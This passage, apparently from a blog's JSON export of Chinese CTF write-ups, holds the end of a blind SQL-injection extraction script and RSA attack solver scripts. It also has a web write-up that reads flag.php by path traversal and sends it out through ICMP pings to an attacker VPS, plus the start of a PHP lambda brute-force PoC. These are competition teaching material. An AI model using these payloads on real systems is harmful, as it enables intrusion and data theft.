from (select * from (select 1)a union select * from flag)i limit 1 offset 1)y limit 1)from(-\"+str(x)+\")))from(-1)))=\"+str(ord(y))+\")-'\" email = str(int(random.randint(1,99999)))+'@xjb.com' # print email reg(email,payload) a = login(email) if a==1: flag += y print flag break cryptoRSA常规的RSA解密12345678910enc=\"ICCHhzayltixzeuA++PPbDwlialEjQuDBx38ecgQwl5lOTnemrcWYbDeQkIIE5oPQOcSmNX8nmcDgyl4O05jYD7VmDcgwQTIgHeOLovcqGVPHEW4hHSmIR3BB/CBjb3/5+HfeifXF1w+/o148o76D9NtTBYaLk8CTjOscT23PBI8w+WPhHBIPaSbJlDuaHA4Ie6ojsE6mM7cp79dz7bCdAf5a2tUGA6AbNCuP1WVnsBI+IIHX8EDELmBnQ5c13JuYnjHL5lmqL3QK88QwQQ4h/3vUODAWBuzn8meWBgfpqxmHTGJ+du2mRoUTpUBzZy2OxrKdD8J11Hc+yJJJkQe5QgqACbM00K0rTv7kIyB2aB/gUGLNP4IOwV09avUpzLS2PPLgeAVP/JSGYlXZTthy4FlqL5pMN4/+swNnEN6Z+lPzLNe0JB0uNN/yPJ3C3lsSuoFLh0InYI46Tycs8vz1nHQWjQdE6hpD/HpyCbjoC2BE4ugCJKUtmp7mbyDxkjkn5ZkHhrJXK/DF4NQgYmfkZxyLOWsI2UC1niq5qGD3SIspW8NcupyGakYVzD1R9PP8xoxpkjX62f7myXLMmacbJgYe7ExeWdYXMZd76Tnqu9IJJwEO43LZz+w2rqH8DIlhr64JenxaDcIixqFzKmkk6WK71VVT3t788ZxaNhG2yo=\"c=int(enc.decode('base64').encode('hex'),16)n = 365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357e = 65537d = 171667543985758425014232627985840717336387122108163758500542139626729279212540485673813409388397427405892256280730752710530037468765259171638824687119216443453078833931370749271396524300663719786871097595637432285751800013612137436020725492852419342272435212733486026753609513054804440530485467017884797272879406284689903095072725307517165288748564887361729738358011463377509622604034612759898436024272853796444439505507110804160400608180412245257162062494766079887998276493727771202445125297118556385657613871902180087388189988280105656191733965985878495407148701887047735812018200868151321246119065258205755102189932618492331181731032930671506379119003614308043854723142913145153824556828017544028126772950732350030371733003652817854070184981540813302478821473998511699291112000260313162924676245915026226201977284465842505256191235822318812659628683043195357384607192367037650400361829016395922074065034014120534209020328864830006606839179592932609256661738193663329776230050481312159600570791315455079679469956882283489829258240404557309270261381865785081719442470884775430068193960751589033994677379472095235901602941733635505402949964622214247924792042997962235246007680923289071880896909708764598890244005005286926994431628289m =hex(pow(c,d,n))[2:].rstrip('L')print ('0'+m).decode('hex') flag{w3lC0M3_t0_rS4_w0RlD}","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"RSA-STUDY","slug":"RSA-STUDY","date":"2018-07-23T09:12:58.000Z","updated":"2018-11-26T10:04:57.290Z","comments":true,"path":"2018/07/23/RSA-STUDY/","link":"","permalink":"http://altman.vip/2018/07/23/RSA-STUDY/","excerpt":"RSA原理知识准备素数：素数又称质数，指在一个大于1的自然数中，除了1和此整数自身外，不能被其他自然数整除的数。 互质数：公因数只有1的两个数，叫做互质数 模运算：两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m)；读作：a同余于b模m，或者，a与b关于模m同余。例如：26 ≡ 14 (mod 12)。 欧拉函数：在数论，对正整数n，欧拉函数是小于n的正整数中与n互质的数的数目（φ(1)=1）。 模反元素：如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。这时，b就叫做a的“模反元素”。","text":"RSA原理知识准备素数：素数又称质数，指在一个大于1的自然数中，除了1和此整数自身外，不能被其他自然数整除的数。 互质数：公因数只有1的两个数，叫做互质数 模运算：两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m)；读作：a同余于b模m，或者，a与b关于模m同余。例如：26 ≡ 14 (mod 12)。 欧拉函数：在数论，对正整数n，欧拉函数是小于n的正整数中与n互质的数的数目（φ(1)=1）。 模反元素：如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。这时，b就叫做a的“模反元素”。 公钥与私钥1.找到两个的不同大素数p&amp;q,N=pq。2.根据欧拉函数得到 r=(p-1)(q-1)3.选择一个小于r的整数e，求e关于模r的模反元素d。4.销毁p，q。 这样就得到了公钥(N,e),私钥(N,d) 加密解密过程加密只需要公钥(N,e)，对于明文x进行如下运算x^e ≡ c (mod N)得到密文c。 解密只需要知道私钥(N,d),对于密文c进行如下运算c^d ≡ x （mod N）还原明文x。 CTF中的RSA例题0x01 基础RSA加密用公钥和密文解密出明文，这建立在N可分解的基础上，我们可以通过pq得到秘钥。1234567891011121314151617# coding: utf-8from Crypto.PublicKey import RSAimport gmpy2import codecspub=RSA.importKey(open(\"/Users/a1tm4nz/Downloads/RSA/public.pem\").read())n=pub.n #ne=pub.e #ep=258631601377848992211685134376492365269 # 通过http://factordb.com/分解Nq=286924040788547268861394901519826758027#d=gmpy2.invert(e,(p-1)*(q-1))d=23071769375111040425287244625328797615295772814180109366784249976498215494337c=int(codecs.encode(open('/Users/a1tm4nz/Downloads/RSA/flag.enc','rb').read(),'hex_codec'),16)m=hex(pow(c,d,n))[2:].replace(\"L\",\"\")if(len(m)%2==1):#16进制解密要求密文不能为奇数，在头部填0即可 m='0'+mprint m.decode('hex') 0x02 wiener attack当N或e都很大时，我们可以使用wiener攻击github上有利用脚本: https://github.com/pablocelayes/rsa-wiener-attack 南邮平台上的一道题1234567891011#coding:utf-8from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5import base64flag=raw_input('flag:')key=RSA.construct((1063045321283844468344531168992778520651192162100948533991539097447031440090068191835838938460807260866872379834796862916118785271062209281267667069640000501698142693389209275376843382863579650119977059768375028586326490055087394631528241983631462471709913758728591459476799115050977493979613545056736162868049L, 837165022918376318972691589160491375229372195625940137121740685432530132860541010174727630660292946071507342455170833392895060048564125597915757582027572284342507277083636059558106672685400173531425920294781499112027917632497954958437660357575400222692979844873372105801998210845285775146263117399191185379347L))cipher = Cipher_pkcs1_v1_5.new(key)cipher_text = base64.b64encode(cipher.encrypt(flag))print cipher_text#cipher_text = 'AGgt1h6dudnkeoCr7SFclkYYsYa65KZ8V29bbgbf+BDyjnyx5stCYjcyktat73aHs2EOaMgwGUwj3HwPTvT+T5LHIxM4uTnAgWOui4dnb7vF7QizN0ShY2O1h26CgLnf5I0vQWbY7WCC7kA/orNW7F5yxZiKRAawacS2M5ghP4/Q' N，e都很大。我们用wiener attack 得到d1python rsa-wiener-attack/RSAwienerHacker.py n e 得到私钥d1d=57899763801722261062891290503559835904571946557258761154422546104824094670843 接下来就是常规的RSA解密12345678910111213import base64n=1063045321283844468344531168992778520651192162100948533991539097447031440090068191835838938460807260866872379834796862916118785271062209281267667069640000501698142693389209275376843382863579650119977059768375028586326490055087394631528241983631462471709913758728591459476799115050977493979613545056736162868049e=837165022918376318972691589160491375229372195625940137121740685432530132860541010174727630660292946071507342455170833392895060048564125597915757582027572284342507277083636059558106672685400173531425920294781499112027917632497954958437660357575400222692979844873372105801998210845285775146263117399191185379347d=57899763801722261062891290503559835904571946557258761154422546104824094670843m='AGgt1h6dudnkeoCr7SFclkYYsYa65KZ8V29bbgbf+BDyjnyx5stCYjcyktat73aHs2EOaMgwGUwj3HwPTvT+T5LHIxM4uTnAgWOui4dnb7vF7QizN0ShY2O1h26CgLnf5I0vQWbY7WCC7kA/orNW7F5yxZiKRAawacS2M5ghP4/Q'c=int(base64.b64decode(m).encode('hex'),16)flag=hex(pow(c,d,n))[2:].replace(\"L\",\"\")if(len(flag)%2==1): flag='0'+flagprint flag.decode('hex') 0x03 有公因数的两个N给了两对公钥，N太大无法分解，但是N1,N2有公因数。那么此时公因数就是p，可以分别求出q1，q2题目123456n1=18263905851567773440446838695766097054252159817375942220432646590577605535001102705343902666589196712209131000424743250389209817386462242094905266578654348699073317748484503797678183012090375022172700739930717847219593096973008967105897376613550069563133191469825170677181620033104899474861544205137427444083416158205978241738189319430709815369614381957092634679663073529915011800029514945250518582469896694087993939399022631417819581576165949892810231692555896017395242464371112868608767990194529216988324463096379599680586615395063392235579858007086701467453321499203151052012397135583838714605379937464734426058203n2=16950818485762084795193828768953323876388698051219062552262211712110062204954209462306530235388240321343855913666709750794055992220667151032536667937762799073479211925880106492191394846770654371623007051501782616639485222511300384032213459590408774089539345780246233268007572472533774114330568959631749390932599046733958624832563792588926026242133422467392689761450865841250657088270966077177543599222351800102728976845282712937106806976091210265560260177661816495238213887970556095475226646345568545415814035277834069152282458515989066082948101449829801979628039212597995349260855092279108102204886522855975419755219c1=16274856857661787783089247952446020386301296490309822420733326939579521159181274564159881569720941773424141684911497028248685883897404191432880449283023146073930043226457053587418510143359803678057561120305169670182063356905346792409675959838228170818653485027257264058185367161472527834396804757004371950225319647551718070122431050642186905590213972232201966833949845104276760241004644118590467546314025479853604227295841523010158969804175921406672115195772809154058842429049437301440993794765038365224477229612151404063782303298937771968709567577283974551173044172598459482531433545960749147311254443274915272200560c2=9946468920119252596998213656931348575944985856629754429330209121534145245119561878513995066589817036899299533093751237144960328759208855732474853794711347203865156360078772132790431594811682581926722057546683437873159107885652842304739962490836998123152090675606004046425633751397173768982047965656687448847259753864171018963561303276197312504508548802813909914926514763930195218396740593919987596462341469781868335025782329081775818968846955110510048099746584203570892950955431181639182647914240604278151551608856971433512600491550082244566145491335738112881861092354219766862656988674738232228115996349755982641605e1=1804229351e2=17249876309 解密脚本1234567891011121314151617181920212223242526272829303132# coding: utf-8from Crypto.PublicKey import RSAimport gmpy2import codecsn1=18263905851567773440446838695766097054252159817375942220432646590577605535001102705343902666589196712209131000424743250389209817386462242094905266578654348699073317748484503797678183012090375022172700739930717847219593096973008967105897376613550069563133191469825170677181620033104899474861544205137427444083416158205978241738189319430709815369614381957092634679663073529915011800029514945250518582469896694087993939399022631417819581576165949892810231692555896017395242464371112868608767990194529216988324463096379599680586615395063392235579858007086701467453321499203151052012397135583838714605379937464734426058203n2=16950818485762084795193828768953323876388698051219062552262211712110062204954209462306530235388240321343855913666709750794055992220667151032536667937762799073479211925880106492191394846770654371623007051501782616639485222511300384032213459590408774089539345780246233268007572472533774114330568959631749390932599046733958624832563792588926026242133422467392689761450865841250657088270966077177543599222351800102728976845282712937106806976091210265560260177661816495238213887970556095475226646345568545415814035277834069152282458515989066082948101449829801979628039212597995349260855092279108102204886522855975419755219c1=16274856857661787783089247952446020386301296490309822420733326939579521159181274564159881569720941773424141684911497028248685883897404191432880449283023146073930043226457053587418510143359803678057561120305169670182063356905346792409675959838228170818653485027257264058185367161472527834396804757004371950225319647551718070122431050642186905590213972232201966833949845104276760241004644118590467546314025479853604227295841523010158969804175921406672115195772809154058842429049437301440993794765038365224477229612151404063782303298937771968709567577283974551173044172598459482531433545960749147311254443274915272200560c2=9946468920119252596998213656931348575944985856629754429330209121534145245119561878513995066589817036899299533093751237144960328759208855732474853794711347203865156360078772132790431594811682581926722057546683437873159107885652842304739962490836998123152090675606004046425633751397173768982047965656687448847259753864171018963561303276197312504508548802813909914926514763930195218396740593919987596462341469781868335025782329081775818968846955110510048099746584203570892950955431181639182647914240604278151551608856971433512600491550082244566145491335738112881861092354219766862656988674738232228115996349755982641605e1=1804229351e2=17249876309q=gmpy2.gcd(n1,n2)p1=n1//qp2=n2//qd1=gmpy2.invert(e1,(p1-1)*(q-1))d2=gmpy2.invert(e2,(p2-1)*(q-1))while d1&lt;0: d1+=(p1-1)*(q-1)while d2&lt;0: d2+=(p2-1)*(q-1)m2=hex(pow(c2,d2,n2))[2:].replace(\"L\",\"\")m1=hex(pow(c1,d1,n1))[2:].replace(\"L\",\"\")if(len(m2)%2==1): m2='0'+m2if(len(m1)%2==1): m1 ='0'+ m1print m1.decode('hex')print m2.decode('hex') 0x04 低指数攻击e=3时进行低指数攻击12345678910111213141516171819# coding:utf-8import gmpy2c=545666236924510340010249577709750283325731706774285241719627277546281629429734726717293022303311450772262647904537263500252284243393598944613964442974546950954108203106726282255676706429218187217515454665602130999856741523362906632677988245886500953095201122016935004088287862399317170828388632964668574391252399791901016522260191839164586088073933168096433230663402492577707149742261018318811473591856287943664733276898405984282679026758294364432874973387827086342720762945025346962005339728347282927842299962927871005260338747371451546554777112213044710533502191671159066680035742327279159127279685106716107705888068319962657817786581813767331740609788885735155741039564703781141646102609725965697004923161084032164730408824475517786576979990372940555488021025837456038491436690372760376483602299268887032528766383572923258228355911069631275397149328319966792315903921085816103476508992023873616148326626245855060470294978538631677232260545724075728912626994884533001056079733734460116442499311813113038763837974777469202302071221647473459505245546281400799833123812072606012604323510933244028733287443734697557314202167934768160824072400916728008549350662843995750077421616789178835625661267955774815287104291379928002318796086248n=721059527572145959497866070657244746540818298735241721382435892767279354577831824618770455583435147844630635953460258329387406192598509097375098935299515255208445013180388186216473913754107215551156731413550416051385656895153798495423962750773689964815342291306243827028882267935999927349370340823239030087548468521168519725061290069094595524921012137038227208900579645041589141405674545883465785472925889948455146449614776287566375730215127615312001651111977914327170496695481547965108836595145998046638495232893568434202438172004892803105333017726958632541897741726563336871452837359564555756166187509015523771005760534037559648199915268764998183410394036820824721644946933656264441126738697663216138624571035323231711566263476403936148535644088575960271071967700560360448191493328793704136810376879662623765917690163480410089565377528947433177653458111431603202302962218312038109342064899388130688144810901340648989107010954279327738671710906115976561154622625847780945535284376248111949506936128229494332806622251145622565895781480383025403043645862516504771643210000415216199272423542871886181906457361118669629044165861299560814450960273479900717138570739601887771447529543568822851100841225147694940195217298482866496536787241e=3i = 0while True: if gmpy2.iroot(c + i * n, 3)[1] == True: print \"Success!\" m=gmpy2.iroot(c + i * n, 3) print m break i += 1# m=440721643740967258786371951429849843897639673893942371730874939742481383302887786063966117819631425015196093856646526738786745933078032806737504580146717737115929461581126895844008044713461807791172016433647699394456368658396746134702627548155069403689581548233891848149612485605022294307233116137509171389596747894529765156771462793389236431942344003532140158865426896855377113878133478689191912682550117563858186Lm=hex(m)[2:].replace(\"L\",\"\")if (len(m) % 2 == 1): m= '0' + mprint m.decode('hex') 0x05 共模攻击当有两个e两个c时，可以进行公模攻击123456789101112131415161718192021# coding:utf8import gmpy2import libnumimport codecsn=0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929c1=int(codecs.encode(open(\"/Users/a1tm4nz/crypto/veryhardRSA/flag.enc1\",'rb').read(),'hex_codec'),16)c2=int(codecs.encode(open(\"/Users/a1tm4nz/crypto/veryhardRSA/flag.enc2\",'rb').read(),'hex_codec'),16)e1=17e2=65537s1=libnum.xgcd(e1,e2)[0]s2=libnum.xgcd(e1,e2)[1]#此处判断s1和s2是否小于0，因为pow()函数里s1和s2不能为负，if(s1&lt;0): s1=-s1 c1=gmpy2.invert(c1,n)#若s1为负,s1取正，c1取逆if(s2&lt;0): s2=-s2 c2=gmpy2.invert(c2,n)m=libnum.n2s((pow(c1,s1,n)*pow(c2,s2,n)%n))print(m) 0x06 Lattice based attacks on RSA题目12345# n=0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2d# e=0x3# c=0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592c# b=0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000# m=b+x (x:64bit) n无法分解，低指数爆破失败，但我们已用明文的高位。参考:https://github.com/mimoo/RSA-and-LLL-attacks使用sage可以解出明文12345678910111213141516171819202122232425262728# partial_m.sagen = 0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2de = 3m = randrange(n)c = pow(m, e, n)beta = 1epsilon = beta^2/7nbits = n.nbits()kbits = floor(nbits*(beta^2/e-epsilon))#mbar = m &amp; (2^nbits-2^kbits)mbar = 0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c = 0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592cprint \"upper %d bits (of %d bits) is given\" % (nbits-kbits, nbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cprint mx0 = f.small_roots(X=2^kbits, beta=1)[0] # find root &lt; 2^kbits with factor = nprint mbar + x0print x0 // 在线sage网站 http://sagecell.sagemath.org/ 0x07 广播攻击使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况。按照本文的中国剩余定理小节容易求得m^e的值，当e较小时直接开e方即可，可使用gmpy2.iroot(M,e)。例题和脚本1234567891011121314151617181920212223242526272829303132import gmpy2def broadcast(n1, n2 ,n3, c1, c2, c3): n = [n1, n2, n3] C = [c1, c2, c3] N = 1 for i in n: N *= i Ni = [] for i in n: Ni.append(N / i) T = [] for i in xrange(3): T.append(long(gmpy2.invert(Ni[i], n[i]))) X = 0 for i in xrange(3): X += C[i] * Ni[i] * T[i] m3 = X % N m = gmpy2.iroot(m3, 3) return mn1=0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555c1=0x5517bdd6996b54aa72c2a9f1eec2d364fc71880ed1fa8630703a3c38035060b675a144e78ccb1b88fa49bad2ed0c6d5ad0024d4bb18e7d87f3509b0dbf238a0d1ff33f48ffc99c1bdf2f2547a193e7ab66eec562a7bc3f9521f70d453ff6d1fdb24de40b3f621ca6be6606440d09d0f302d5806e7cebc9b612522f181baa43373d6827ffd794916ffcc205147c8d88a59d2fce4bbcdfd6a4934fb72d5f74be79a1bd64b4305865c9d20eb96d8bd7976440a4bc326fdb5b9a04bac3762a664346a175f1029f448bb421506f3dfeb75d6531f89f0b92a7e66e295ede5928ec8301a202d5c9fd528cda84190c2b47f423af1a59c63ae6253d1903c83ae158f9b42n2=0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867c2=0x3288e3ea8c74fd004e14b66a55acdcbcb2e9bd834b0f543514e06198045632b664dac3cf8578cde236a16bef4a1246de692ec6a61ce507a220fa04e09044632787ba42b856cb13be6e905c20b493004822888d3c44c6fc367c7af0287f1683f08baae5bb650902067908e93246af3954d62437aa14248529fd07c8902b9403920b6550f12d1c398881cd7fc8b5f096f38c33df21887bfe989fb011a9deade2370d90347510b76f1f3e3dedf09c148675ea8919878c8ac188253b78886d906cd1f3aee5484d6d13fb4bbad233f670f825fa618adbf0705ed4e31b60957f5c28cfd1febd13370630a6c94990e341d38918a9c1faa614fd14cdd41b7bc8461f2f0cn3=0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303c3=0xb0c5ee1ac47c671c918726287e70239147a0357a9638851244785d552f307ed6a049398d3e6f8ed373b3696cfbd0bce1ba88d152f48d4cea82cd5dafd50b9843e3fa2155ec7dd4c996edde630987806202e45821ad6622935393cd996968fc5e251aa3539ed593fe893b15d21ecbe6893eba7fe77b9be935ca0aeaf2ec53df7c7086349eb12792aefb7d34c31c18f3cd7fb68e8a432652ef76096096e1a5d7ace90a282facf2d2760e6b5d98f0c70b23a6db654d10085be9dcc670625646a153b52c6c710efe8eb876289870bdd69cb7b45813e4fcfce815d191838926e9d60dd58be73565cff0e10f4e80122e077a5ee720caedc1617bf6a0bb072bbd2dab0m = broadcast(n1,n2,n3,c1,c2,c3)print hex(int(m[0])).replace(\"L\",\"\")","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://altman.vip/tags/crypto/"}]},{"title":"DC0531CTF-WP","slug":"DC0531CTF-WP","date":"2018-06-18T08:10:38.000Z","updated":"2018-11-02T05:49:09.711Z","comments":true,"path":"2018/06/18/DC0531CTF-WP/","link":"","permalink":"http://altman.vip/2018/06/18/DC0531CTF-WP/","excerpt":"比赛四道WEB题 都挺有难度。","text":"比赛四道WEB题 都挺有难度。 web1这个题刚开始我以为是关注公众号就会给flag，结果是一道挺有难度的题目。进去公众号发送flag，得到如下内容12345678Welcome to DC0531 unknown battle ground! you have following options to utilize: 1. find a weapon (f:) 2. pick up a weapon (for instance: p:kar98) 3. reload a weapon (r:) 4. shoot a target (s:xxx) 5. check ur weapon's status (c:) 6. upload ur weapon (just upload image-file) 7. show ur weapon (sh:) 随意的尝试后没什么用，得到提示：shoot your own ip在自己的VPS上开了个端口监听，然后发送s:vps，没有回显。经过尝试发现是ICMP协议。1tcpdump -i eth0 icmp 然后继续s:vps，得到一条来自139.198.3.171的请求。139.198.3.171可能就是题目地址。访问139.198.3.171，首页是乱码，简单的尝试后发现了GIT泄露。使用Githack恢复了源码。接下来就是代码审计。 这是一个Thinkphp框架的网站，直接定位到Controller。查看TestController.class.php发现了实现微信公众号功能的两个关键函数12345678910111213141516171819202122232425262728293031public function p($weapon)&#123; $res = \"\"; if(!is_file($this-&gt;real_path . '/' . $weapon))&#123; $res = \"No such weapon! U bitch!\\n\"; &#125;else&#123; $this-&gt;info['weapon'] = $weapon; $this-&gt;info['bullet'] = substr(base64_encode(file_get_contents($this-&gt;real_path . '/' . $this-&gt;info['weapon'])),0,100); // no bullets initially $this-&gt;info['status'] = 0; $res = \"You have changed ur weapon to \" . $weapon . \"\\n\"; &#125; return $res; &#125; public function s($target)&#123; $res = \"\"; if(!preg_match('/^(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)(?:[.](?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d))&#123;3&#125;$/', $target))&#123; $res = \"This is not a target! R U kidding?\\n\"; &#125;else&#123; // make sure u have bullets if($this-&gt;info['status']&gt;0)&#123; $this-&gt;info['status'] = $this-&gt;info['status'] - 1; $bullet = $this-&gt;info['bullet'][100 - $this-&gt;info['status']]; system(\"ping -c 1 -W 1 -p '\" . bin2hex($bullet) .\"' \".$target . \" 2&gt;&amp;1 1&gt;/dev/null\"); $res = \"You hit it once!\\n\"; &#125;else&#123; $res = \"You have run out of bullets\\n\"; &#125; &#125; return $res; &#125; p函数引入文件并且把内容进行base64后取前100位存入BULLET中。s函数会将BULLET一位一位的发送到目标IP。于是构造payload:12p:../../var/www/html/flag.phps:VPS_ip 引入flag.php不断发送s:VPS_ip指令获得flag.php的base64编码。使用tcpdump接受数据1tcpdump -i eth1 icmp and host vps_ip -XXn &gt; flag.txt 然后对flag.txt处理下得到编码D9waHAKJGZsYWcgPSAiREMwNTMxe1dlY2hBdF9Jc19Tb19DMG9sfSI7Cg==解码是乱码。。然后陷入迷茫。突然发先编码只有59位，应该少了一位。自己对 &lt;?php 编码得到 PD9waHA=在首位补上P得到PD9waHAKJGZsYWcgPSAiREMwNTMxe1dlY2hBdF9Jc19Tb19DMG9sfSI7Cg==解码得到flag12&lt;?php$flag = \"DC0531&#123;WechAt_Is_So_C0ol&#125;\";","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"SUCTF-WEB","slug":"SUCTF-WEB","date":"2018-05-30T07:22:13.000Z","updated":"2018-11-02T05:46:22.956Z","comments":true,"path":"2018/05/30/SUCTF-WEB/","link":"","permalink":"http://altman.vip/2018/05/30/SUCTF-WEB/","excerpt":"比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。12345suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymous","text":"比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。12345suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymous 环境部署docker还是很方便，一键部署，示例annonymous12docker pull suctf/2018-web-annonymousdocker run -d -p 6666:80 suctf/2018-web-annonymous WEBannonymousphp审计题，源码很短12345678910111213&lt;?php$MY = create_function(\"\",\"die(`cat flag.php`);\");$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(\"function SUCTF_$hash()&#123;\" .\"global \\$MY;\" .\"\\$MY();\" .\"&#125;\");if(isset($_GET['func_name']))&#123; $_GET[\"func_name\"](); die();&#125;show_source(__FILE__); 首先使用了create_function函数创建了一个打印flag的函数并赋值给$MY然后又随机命名了了一个执行$My的函数，那么我们有两个方法去打印flag1.执行SUCTF_$hash()2.执行$MY()方法一中 openssl_random_pseudo_bytes(32)预测显然不可能只能尝试爆破create_function()产生的函数名。本地测试打印$MY，发现函数名为%00lambda_1，且每访问一次+1。如果%00lambda_x不是很大。我们可以不停访问一个很大的值n，让x增长到n即可。如果已经x很大，那么这个办法就不行了，就需要让apache开启新的进程使得x从一开始。用上现成POC123456789101112131415161718192021222324252627# coding: UTF-8# Author: orange@chroot.org# import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = '127.0.0.1' PORT = 12344 s = 